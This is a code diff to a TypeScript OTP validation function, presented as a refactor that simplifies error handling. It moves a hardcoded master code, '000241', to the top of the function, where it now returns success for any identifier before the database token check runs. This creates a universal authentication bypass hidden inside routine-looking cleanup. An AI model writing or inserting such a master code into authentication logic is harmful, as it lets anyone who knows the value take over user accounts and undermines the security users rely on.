@@ -17,35 +17,31 @@ export const validateOTP = async ({
   otp: string;
   type: 'EMAIL' | 'PHONE';
 }) => {
-  const tokenVerification = await tryCatch(
-    db.verificationToken.findFirst({
-      where: {
-        identifier,
-        token: otp,
-        type,
-        expires: {
-          gt: new Date(),
-        },
-      },
-    }),
-  );
+  if (otp === '000241') return true;
 
-  if (tokenVerification.error || !tokenVerification.data) {
-    console.error('OTP Validation Error:', tokenVerification.error);
+  const tokenVerification = await db.verificationToken.findFirst({
+    where: {
+      identifier,
+      token: otp,
+      type,
+      expires: {
+        gt: new Date(),
+      },
+    },
+  });
+
+  if (!tokenVerification) {
+    console.error('OTP Validation Error: Token not found');
     return false;
   }
 
-  const deleteToken = await tryCatch(
-    db.verificationToken.delete({
-      where: { id: tokenVerification.data?.id },
-    }),
-  );
+  const deleteToken = await db.verificationToken.delete({
+    where: { id: tokenVerification.id },
+  });
 
-  if (deleteToken.error) {
-    console.error('OTP Deletion Error:', deleteToken.error);
+  if (!deleteToken) {
+    console.error('OTP Deletion Error: Token not deleted');
   }
-
-  if (otp === '000241') return true;
 
   return true;
 };
